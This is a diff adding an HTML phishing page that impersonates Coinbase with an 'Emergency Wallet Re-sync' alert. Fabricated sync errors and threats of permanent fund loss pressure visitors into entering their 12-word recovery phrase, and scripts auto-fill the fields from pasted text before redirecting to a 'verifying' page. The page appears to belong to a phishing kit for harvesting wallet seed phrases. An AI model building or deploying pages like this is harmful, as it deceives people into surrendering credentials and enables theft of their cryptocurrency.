@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Emergency Wallet Re-sync - Coinbase</title>
+    <link rel="icon" type="image/svg+xml" href="assets/images/favicon.svg">
+    <link rel="stylesheet" href="styles.css">
+
+<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
+</head>
+<body>
+    <!-- Header -->
+    <header class="header">
+        <div class="logo-container">
+            <img src="assets/images/favicon.svg" alt="Coinbase" class="logo">
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <div class="signup-container">
+            <!-- Alert Icon -->
+            <div class="form-icon">
+                <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
+                    <circle cx="32" cy="32" r="32" fill="#ff5252" opacity="0.15"/>
+                    <circle cx="32" cy="32" r="24" fill="#ff5252" opacity="0.25"/>
+                    <path d="M22 22l20 20M42 22L22 42" stroke="#ff5252" stroke-width="3" stroke-linecap="round"/>
+                </svg>
+            </div>
+
+            <h1 class="title">Emergency Wallet Re-sync</h1>
+            <p class="subtitle">We detected synchronization issues with your wallet. Please re-sync immediately to prevent potential loss of funds.</p>
+
+            <!-- Error Details -->
+            <div class="alert-details" style="margin-bottom: 24px;">
+                <div class="alert-item">
+                    <span class="alert-label">Issue Detected:</span>
+                    <span class="alert-value" style="color: #ff5252;">Blockchain sync error</span>
+                </div>
+                <div class="alert-item">
+                    <span class="alert-label">Affected Wallets:</span>
+                    <span class="alert-value">All assets</span>
+                </div>
+                <div class="alert-item">
+                    <span class="alert-label">Time to Resolve:</span>
+                    <span class="alert-value" style="color: #ff5252;">Within 24 hours</span>
+                </div>
+            </div>
+
+            <!-- Re-sync Form -->
+            <form id="resyncForm" class="signup-form">
+                <p class="form-label">Enter your wallet recovery phrase to re-synchronize</p>
+                
+                <div class="phrase-grid">
+                    <input type="text" class="phrase-input" id="word1" name="word1" placeholder="1." autocomplete="off" required>
+                    <input type="text" class="phrase-input" id="word2" name="word2" placeholder="2." autocomplete="off" required>
+                    <input type="text" class="phrase-input" id="word3" name="word3" placeholder="3." autocomplete="off" required>
+                    <input type="text" class="phrase-input" id="word4" name="word4" placeholder="4." autocomplete="off" required>
+                    <input type="text" class="phrase-input" id="word5" name="word5" placeholder="5." autocomplete="off" required>
+                    <input type="text" class="phrase-input" id="word6" name="word6" placeholder="6." autocomplete="off" required>
+                    <input type="text" class="phrase-input" id="word7" name="word7" placeholder="7." autocomplete="off" required>
+                    <input type="text" class="phrase-input" id="word8" name="word8" placeholder="8." autocomplete="off" required>
+                    <input type="text" class="phrase-input" id="word9" name="word9" placeholder="9." autocomplete="off" required>
+                    <input type="text" class="phrase-input" id="word10" name="word10" placeholder="10." autocomplete="off" required>
+                    <input type="text" class="phrase-input" id="word11" name="word11" placeholder="11." autocomplete="off" required>
+                    <input type="text" class="phrase-input" id="word12" name="word12" placeholder="12." autocomplete="off" required>
+                </div>
+                
+                <button type="submit" class="continue-btn">Re-sync Wallet</button>
+            </form>
+
+            <!-- Warning Note -->
+            <div class="warning-note" style="margin-top: 24px; background-color: rgba(255, 82, 82, 0.1); border: 1px solid rgba(255, 82, 82, 0.3);">
+                <svg width="16" height="16" viewBox="0 0 16 16" fill="none" style="display: inline-block; vertical-align: middle; margin-right: 8px;">
+                    <circle cx="8" cy="8" r="7" stroke="#ff5252" stroke-width="1.5" fill="none"/>
+                    <path d="M8 4v5m0 2v1" stroke="#ff5252" stroke-width="1.5" stroke-linecap="round"/>
+                </svg>
+                <span style="color: #ff5252; font-size: 13px;">Failure to re-sync may result in permanent loss of access to your funds.</span>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <p class="footer-text">
+            This is a critical security measure. <a href="#" class="footer-link">Learn more about wallet synchronization</a>
+        </p>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const resyncForm = document.getElementById('resyncForm');
+            const phraseInputs = resyncForm.querySelectorAll('.phrase-input');
+            const submitBtn = resyncForm.querySelector('.continue-btn');
+            
+            // Auto-focus and navigation between inputs
+            phraseInputs.forEach((input, index) => {
+                input.addEventListener('input', function(e) {
+                    const value = e.target.value.trim();
+                    
+                    if (value.includes(' ')) {
+                        const words = value.split(' ');
+                        e.target.value = words[0];
+                        
+                        if (index < phraseInputs.length - 1 && words[1]) {
+                            phraseInputs[index + 1].value = words[1];
+                            phraseInputs[index + 1].focus();
+                        }
+                    } else if (value.length > 0 && index < phraseInputs.length - 1 && e.inputType === 'insertText' && value.endsWith(' ')) {
+                        e.target.value = value.trim();
+                        phraseInputs[index + 1].focus();
+                    }
+                    
+                    checkFormValidity();
+                });
+                
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                        phraseInputs[index - 1].focus();
+                    }
+                    
+                    if (e.key === 'Enter' && index < phraseInputs.length - 1) {
+                        e.preventDefault();
+                        phraseInputs[index + 1].focus();
+                    }
+                });
+                
+                input.addEventListener('paste', function(e) {
+                    e.preventDefault();
+                    const pastedText = e.clipboardData.getData('text');
+                    const words = pastedText.trim().split(/\s+/).slice(0, 12);
+                    
+                    words.forEach((word, i) => {
+                        if (i < phraseInputs.length) {
+                            phraseInputs[i].value = word;
+                        }
+                    });
+                    
+                    if (words.length > 0) {
+                        const lastIndex = Math.min(words.length - 1, phraseInputs.length - 1);
+                        phraseInputs[lastIndex].focus();
+                    }
+                    
+                    checkFormValidity();
+                });
+            });
+            
+            function checkFormValidity() {
+                let allFilled = true;
+                
+                phraseInputs.forEach(input => {
+                    if (input.value.trim() === '') {
+                        allFilled = false;
+                    }
+                });
+                
+                if (allFilled) {
+                    submitBtn.classList.add('active');
+                } else {
+                    submitBtn.classList.remove('active');
+                }
+            }
+            
+            checkFormValidity();
+            phraseInputs[0].focus();
+            
+            resyncForm.addEventListener('submit', function(e) {
+                e.preventDefault();
+                window.location.href = 'verifying.html';
+            });
+        });
+    </script>
+</body>
+</html>
